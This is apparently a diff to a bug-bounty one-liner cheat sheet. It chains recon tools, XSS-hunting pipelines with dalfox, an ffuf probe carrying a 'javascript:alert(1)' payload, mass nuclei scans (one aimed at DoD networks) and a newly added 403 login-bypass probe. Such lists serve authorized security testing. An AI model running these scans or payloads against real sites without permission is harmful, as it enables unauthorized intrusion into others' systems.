@@ -120,10 +120,10 @@ echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img
 ## Find xss
 > @skothastad
 ```bash
-cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
+cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
 ```
 
->@mamunwhh
+> @mamunwhh
 ```bash
 cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
 ```
@@ -152,7 +152,7 @@ curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\
 ```
 
 ## Nuclei scan to bugbounty targets.
-> hack_fish
+> @hack_fish
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
 ```
@@ -274,4 +274,15 @@ uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -sile
 > @0x_rood
 ```bash
 cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
+```
+
+# 403 login Bypass
+> @_bughunter
+```bash
+cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+```
+
+# Recon Parameters
+```bash
+echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
 ```
